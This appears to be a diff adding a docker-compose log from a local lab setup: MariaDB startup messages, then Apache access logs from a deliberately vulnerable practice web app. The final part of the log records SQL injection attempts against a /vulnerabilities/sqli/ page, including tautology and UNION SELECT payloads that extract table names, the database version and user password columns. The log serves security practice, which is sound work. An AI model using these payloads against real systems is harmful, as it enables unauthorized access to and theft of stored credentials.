@@ -1,0 +1,154 @@
+Attaching to Vault_Tec_Vault_Tec, Vault_Tec_db_1
+db_1    | 2024-10-04 15:15:19+00:00 [Note] [Entrypoint]: Entrypoint script for MariaDB Server 1:10.11.9+maria~ubu2204 started.
+db_1    | 2024-10-04 15:15:19+00:00 [Warn] [Entrypoint]: /sys/fs/cgroup///memory.pressure not writable, functionality unavailable to MariaDB
+db_1    | 2024-10-04 15:15:19+00:00 [Note] [Entrypoint]: Switching to dedicated user 'mysql'
+db_1    | 2024-10-04 15:15:19+00:00 [Note] [Entrypoint]: Entrypoint script for MariaDB Server 1:10.11.9+maria~ubu2204 started.
+db_1    | 2024-10-04 15:15:20+00:00 [Note] [Entrypoint]: Initializing database files
+db_1    | 2024-10-04 15:15:23+00:00 [Note] [Entrypoint]: Database files initialized
+db_1    | 2024-10-04 15:15:23+00:00 [Note] [Entrypoint]: Starting temporary server
+db_1    | 2024-10-04 15:15:23+00:00 [Note] [Entrypoint]: Waiting for server startup
+db_1    | 2024-10-04 15:15:23 0 [Note] Starting MariaDB 10.11.9-MariaDB-ubu2204 source revision 0e8fb977b00983d98c4c35e39bc1f36463095938 server_uid 72+4ASMvYxproTQgRqIDplDA1XA= as process 87
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: Compressed tables use zlib 1.2.11
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: Number of transaction pools: 1
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: Using crc32 + pclmulqdq instructions
+db_1    | 2024-10-04 15:15:23 0 [Note] mariadbd: O_TMPFILE is not supported on /tmp (disabling future attempts)
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: Using liburing
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: Initializing buffer pool, total size = 128.000MiB, chunk size = 2.000MiB
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: Completed initialization of buffer pool
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: File system buffers for log disabled (block size=512 bytes)
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: End of log at LSN=46980
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: 128 rollback segments are active.
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: Setting file './ibtmp1' size to 12.000MiB. Physically writing the file full; Please wait ...
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: File './ibtmp1' size is now 12.000MiB.
+db_1    | 2024-10-04 15:15:23 0 [Note] InnoDB: log sequence number 46980; transaction id 14
+db_1    | 2024-10-04 15:15:23 0 [Note] Plugin 'FEEDBACK' is disabled.
+db_1    | 2024-10-04 15:15:23 0 [Note] mariadbd: ready for connections.
+db_1    | Version: '10.11.9-MariaDB-ubu2204'  socket: '/run/mysqld/mysqld.sock'  port: 0  mariadb.org binary distribution
+db_1    | 2024-10-04 15:15:24+00:00 [Note] [Entrypoint]: Temporary server started.
+db_1    | 2024-10-04 15:15:25+00:00 [Note] [Entrypoint]: Creating database Vault_Tec
+db_1    | 2024-10-04 15:15:25+00:00 [Note] [Entrypoint]: Creating user Vault_Tec
+db_1    | 2024-10-04 15:15:25+00:00 [Note] [Entrypoint]: Giving user Vault_Tec access to schema Vault_Tec
+db_1    | 2024-10-04 15:15:25+00:00 [Note] [Entrypoint]: Securing system users (equivalent to running mysql_secure_installation)
+db_1    | 
+db_1    | 2024-10-04 15:15:26+00:00 [Note] [Entrypoint]: Stopping temporary server
+db_1    | 2024-10-04 15:15:26 0 [Note] mariadbd (initiated by: unknown): Normal shutdown
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: FTS optimize thread exiting.
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Starting shutdown...
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Dumping buffer pool(s) to /var/lib/mysql/ib_buffer_pool
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Buffer pool(s) dump completed at 241004 15:15:26
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Removed temporary tablespace data file: "./ibtmp1"
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Shutdown completed; log sequence number 46980; transaction id 15
+db_1    | 2024-10-04 15:15:26 0 [Note] mariadbd: Shutdown complete
+db_1    | 
+db_1    | 2024-10-04 15:15:26+00:00 [Note] [Entrypoint]: Temporary server stopped
+db_1    | 
+db_1    | 2024-10-04 15:15:26+00:00 [Note] [Entrypoint]: MariaDB init process done. Ready for start up.
+db_1    | 
+db_1    | 2024-10-04 15:15:26 0 [Note] Starting MariaDB 10.11.9-MariaDB-ubu2204 source revision 0e8fb977b00983d98c4c35e39bc1f36463095938 server_uid 72+4ASMvYxproTQgRqIDplDA1XA= as process 1
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Compressed tables use zlib 1.2.11
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Number of transaction pools: 1
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Using crc32 + pclmulqdq instructions
+db_1    | 2024-10-04 15:15:26 0 [Note] mariadbd: O_TMPFILE is not supported on /tmp (disabling future attempts)
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Using liburing
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Initializing buffer pool, total size = 128.000MiB, chunk size = 2.000MiB
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Completed initialization of buffer pool
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: File system buffers for log disabled (block size=512 bytes)
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: End of log at LSN=46980
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: 128 rollback segments are active.
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Setting file './ibtmp1' size to 12.000MiB. Physically writing the file full; Please wait ...
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: File './ibtmp1' size is now 12.000MiB.
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: log sequence number 46980; transaction id 14
+db_1    | 2024-10-04 15:15:26 0 [Note] Plugin 'FEEDBACK' is disabled.
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Loading buffer pool(s) from /var/lib/mysql/ib_buffer_pool
+db_1    | 2024-10-04 15:15:26 0 [Warning] You need to use --log-bin to make --expire-logs-days or --binlog-expire-logs-seconds work.
+db_1    | 2024-10-04 15:15:26 0 [Note] Server socket created on IP: '0.0.0.0'.
+db_1    | 2024-10-04 15:15:26 0 [Note] Server socket created on IP: '::'.
+db_1    | 2024-10-04 15:15:26 0 [Note] InnoDB: Buffer pool(s) load completed at 241004 15:15:26
+db_1    | 2024-10-04 15:15:26 0 [Note] mariadbd: ready for connections.
+db_1    | Version: '10.11.9-MariaDB-ubu2204'  socket: '/run/mysqld/mysqld.sock'  port: 3306  mariadb.org binary distribution
+Vault_Tec  | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.18.0.3. Set the 'ServerName' directive globally to suppress this message
+Vault_Tec  | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.18.0.3. Set the 'ServerName' directive globally to suppress this message
+Vault_Tec  | [Fri Oct 04 15:15:20.282819 2024] [mpm_prefork:notice] [pid 1:tid 1] AH00163: Apache/2.4.62 (Debian) PHP/8.3.12 configured -- resuming normal operations
+Vault_Tec  | [Fri Oct 04 15:15:20.283176 2024] [core:notice] [pid 1:tid 1] AH00094: Command line: 'apache2 -D FOREGROUND'
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:40 +0000] "GET / HTTP/1.1" 302 740 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:41 +0000] "GET /login.php HTTP/1.1" 200 982 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:41 +0000] "GET /Vault_Tec/css/login.css HTTP/1.1" 200 741 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:41 +0000] "GET /Vault_Tec/images/login_logo.png HTTP/1.1" 200 9374 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:41 +0000] "GET /favicon.ico HTTP/1.1" 200 1706 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:46 +0000] "POST /login.php HTTP/1.1" 302 525 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:46 +0000] "GET /setup.php HTTP/1.1" 200 1905 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:46 +0000] "GET /Vault_Tec/css/main.css HTTP/1.1" 200 1557 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:46 +0000] "GET /Vault_Tec/js/add_event_listeners.js HTTP/1.1" 200 619 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:46 +0000] "GET /Vault_Tec/js/Vault_TecPage.js HTTP/1.1" 200 809 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:46 +0000] "GET /Vault_Tec/images/logo.png HTTP/1.1" 200 5330 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:46 +0000] "GET /Vault_Tec/images/spanner.png HTTP/1.1" 200 748 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:54 +0000] "GET /instructions.php HTTP/1.1" 200 12625 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:55 +0000] "GET /docs/graphics/docker/overview.png HTTP/1.1" 200 73497 "http://localhost:4280/instructions.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:20:55 +0000] "GET /docs/graphics/docker/detail.png HTTP/1.1" 200 164637 "http://localhost:4280/instructions.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:28 +0000] "GET /instructions.php?doc=changelog HTTP/1.1" 200 3671 "http://localhost:4280/instructions.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:28 +0000] "GET /Vault_Tec/css/main.css HTTP/1.1" 200 1557 "http://localhost:4280/instructions.php?doc=changelog" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:28 +0000] "GET /Vault_Tec/js/Vault_TecPage.js HTTP/1.1" 200 809 "http://localhost:4280/instructions.php?doc=changelog" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:28 +0000] "GET /Vault_Tec/js/add_event_listeners.js HTTP/1.1" 200 618 "http://localhost:4280/instructions.php?doc=changelog" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:28 +0000] "GET /Vault_Tec/images/logo.png HTTP/1.1" 304 249 "http://localhost:4280/instructions.php?doc=changelog" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:31 +0000] "GET /setup.php HTTP/1.1" 200 1863 "http://localhost:4280/instructions.php?doc=changelog" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:31 +0000] "GET /Vault_Tec/images/spanner.png HTTP/1.1" 304 248 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:41 +0000] "POST /setup.php HTTP/1.1" 302 364 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:41 +0000] "GET /setup.php HTTP/1.1" 200 2039 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:46 +0000] "GET /login.php HTTP/1.1" 200 983 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:46 +0000] "GET /Vault_Tec/images/login_logo.png HTTP/1.1" 304 249 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:46 +0000] "GET /Vault_Tec/css/login.css HTTP/1.1" 200 741 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:52 +0000] "POST /login.php HTTP/1.1" 302 526 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:52 +0000] "GET /login.php HTTP/1.1" 200 999 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:56 +0000] "POST /login.php HTTP/1.1" 302 525 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:23:56 +0000] "GET /login.php HTTP/1.1" 200 998 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:03 +0000] "POST /login.php HTTP/1.1" 302 526 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:03 +0000] "GET /login.php HTTP/1.1" 200 999 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:03 +0000] "GET /Vault_Tec/css/login.css HTTP/1.1" 200 741 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:03 +0000] "GET /Vault_Tec/images/login_logo.png HTTP/1.1" 304 249 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:12 +0000] "POST /login.php HTTP/1.1" 302 526 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:12 +0000] "GET /index.php HTTP/1.1" 200 2756 "http://localhost:4280/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:12 +0000] "GET /Vault_Tec/css/main.css HTTP/1.1" 200 1557 "http://localhost:4280/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:12 +0000] "GET /Vault_Tec/js/Vault_TecPage.js HTTP/1.1" 200 808 "http://localhost:4280/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:12 +0000] "GET /Vault_Tec/js/add_event_listeners.js HTTP/1.1" 200 618 "http://localhost:4280/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:12 +0000] "GET /Vault_Tec/images/logo.png HTTP/1.1" 304 249 "http://localhost:4280/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:30:18 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1778 "http://localhost:4280/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:06 +0000] "GET / HTTP/1.1" 200 2729 "http://localhost:4280/vulnerabilities/sqli/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:08 +0000] "GET /setup.php HTTP/1.1" 200 2242 "http://localhost:4280/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:08 +0000] "GET /Vault_Tec/images/spanner.png HTTP/1.1" 304 248 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:14 +0000] "GET /instructions.php HTTP/1.1" 200 12975 "http://localhost:4280/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:14 +0000] "GET /docs/graphics/docker/detail.png HTTP/1.1" 304 250 "http://localhost:4280/instructions.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:14 +0000] "GET /docs/graphics/docker/overview.png HTTP/1.1" 304 251 "http://localhost:4280/instructions.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:16 +0000] "GET / HTTP/1.1" 200 2728 "http://localhost:4280/instructions.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:31 +0000] "GET /security.php HTTP/1.1" 200 2104 "http://localhost:4280/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:31 +0000] "GET /Vault_Tec/css/main.css HTTP/1.1" 200 1557 "http://localhost:4280/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:31 +0000] "GET /Vault_Tec/js/add_event_listeners.js HTTP/1.1" 200 619 "http://localhost:4280/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:31 +0000] "GET /Vault_Tec/js/Vault_TecPage.js HTTP/1.1" 200 809 "http://localhost:4280/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:31 +0000] "GET /Vault_Tec/images/lock.png HTTP/1.1" 200 1045 "http://localhost:4280/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:31 +0000] "GET /Vault_Tec/images/logo.png HTTP/1.1" 304 249 "http://localhost:4280/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:37 +0000] "POST /security.php HTTP/1.1" 302 537 "http://localhost:4280/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:37 +0000] "GET /security.php HTTP/1.1" 200 2121 "http://localhost:4280/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:32:43 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1716 "http://localhost:4280/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:33:16 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 1739 "http://localhost:4280/vulnerabilities/sqli/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:33:53 +0000] "GET /vulnerabilities/sqli/?id=%27UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables+--&Submit=Submit HTTP/1.1" 200 728 "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:15:34:27 +0000] "GET /vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit HTTP/1.1" 200 1799 "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:16:58:41 +0000] "GET /vulnerabilities/sqli/?id=%27UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables+--&Submit=Submit HTTP/1.1" 200 728 "http://localhost:4280/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:16:59:00 +0000] "GET /vulnerabilities/sqli/?id=UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables+--&Submit=Submit HTTP/1.1" 200 1716 "http://localhost:4280/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:16:59:00 +0000] "GET /Vault_Tec/css/main.css HTTP/1.1" 200 1557 "http://localhost:4280/vulnerabilities/sqli/?id=UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables+--&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:16:59:00 +0000] "GET /Vault_Tec/js/Vault_TecPage.js HTTP/1.1" 200 809 "http://localhost:4280/vulnerabilities/sqli/?id=UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables+--&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:16:59:00 +0000] "GET /Vault_Tec/js/add_event_listeners.js HTTP/1.1" 200 618 "http://localhost:4280/vulnerabilities/sqli/?id=UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables+--&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:16:59:00 +0000] "GET /Vault_Tec/images/logo.png HTTP/1.1" 304 249 "http://localhost:4280/vulnerabilities/sqli/?id=UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables+--&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:16:59:17 +0000] "GET /vulnerabilities/sqli/?id=%27UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables+&Submit=Submit HTTP/1.1" 200 725 "http://localhost:4280/vulnerabilities/sqli/?id=UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables+--&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:16:59:39 +0000] "GET /vulnerabilities/sqli/?id=%27UNION+SELECT+user%2C+password+FROM+users+--&Submit=Submit HTTP/1.1" 200 728 "http://localhost:4280/vulnerabilities/sqli/?id=UNION+SELECT+table_name%2C+NULL+FROM+information_schema.tables+--&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:00:25 +0000] "GET /vulnerabilities/sqli/?id=1%20UNION%20SELECT%20user,%20password%20FROM%20users%20-- HTTP/1.1" 200 1716 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:06:12 +0000] "GET /vulnerabilities/sqli/?id=%25%27+or+%270%27%3D%270&Submit=Submit HTTP/1.1" 200 1798 "http://localhost:4280/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20user,%20password%20FROM%20users%20--" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:06:47 +0000] "GET /vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit HTTP/1.1" 200 1847 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+or+%270%27%3D%270&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:07:37 +0000] "GET /vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+user%28%29+%23&Submit=Submit HTTP/1.1" 200 1838 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:08:15 +0000] "GET /vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+database%28%29+%23&Submit=Submit HTTP/1.1" 200 1828 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+user%28%29+%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+Vault_Tec  | 172.18.0.1 - - [04/Oct/2024:17:08:53 +0000] "GET /vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit HTTP/1.1" 200 2473 "http://localhost:4280/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+database%28%29+%23&Submit=Submit" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
